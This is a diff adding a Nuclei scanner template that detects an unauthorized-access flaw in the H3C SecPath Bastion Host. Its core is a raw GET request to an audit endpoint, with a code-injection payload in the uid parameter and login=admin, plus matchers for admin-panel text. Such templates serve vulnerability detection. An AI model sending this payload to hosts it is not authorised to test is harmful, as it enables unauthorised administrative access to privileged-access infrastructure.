@@ -1,0 +1,28 @@
+id: h3c-secpath-bastion-host-unauthorized-access
+info:
+  name: H3C SecPath Bastion Host Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for unauthorized access in H3C SecPath Bastion Host by using a specific vulnerable endpoint and identifying administrative access leakage.
+http:
+  - raw:
+      - |
+        GET /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "错误的id"
+          - "审计管理员"
+      - type: word
+        part: body
+        words:
+          - "admin"
+        condition: or
